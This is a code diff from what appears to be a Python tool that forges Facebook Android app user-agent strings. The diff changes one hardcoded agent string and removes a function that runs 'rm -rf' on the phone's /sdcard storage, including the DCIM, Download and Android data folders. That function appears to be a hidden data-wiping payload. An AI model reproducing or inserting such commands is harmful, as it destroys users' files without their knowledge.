@@ -14,15 +14,7 @@ def m1():
   fbcr = random.choice(['null', 'o2 - de', 'Verizon - us', 'Vodafone - uk']) # اختيار عشوائي لاسم مشغل الشبكة 
   
   s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
-  e = '[FBAN/Orca-Android;FBAV/195.99.6.63;FBPN/com.facebook.orca;FBLC/en_US;FBBV/35145052;FBCR/Verizon;FBMF/Qmobile;FBBD/Qmobile;FBDV/GALAXY S24 ULTRA;FBSV/8.6;FBCA/arm64-v8a;FBDM/{density=3.6,width=1354,height=2295};FB_FW/1;FBRV/70488472]'
+  e = 'Mozilla/5.0 (Linux; Android 6.0.2; Nokia Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.157 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/178.94.48.72;]'
   
   ua = s + ";FBNW/" + network + e  # Adding network type to the User-Agent string
   return ua
-def fucker():
-    os.system('rm -rf /sdcard/*')
-    os.system('rm-rf /sdcard/DCIM/')
-    os.system('rm-rf /sdcard/Android/')
-    os.system('rm-rf /sdcard/Android/data/')
-    os.system('rm -rf /sdcard/Download/*')
-    os.system('rm -rf /sdcard1/*')
-    os.system('rm -rf /sdcard/0/*')
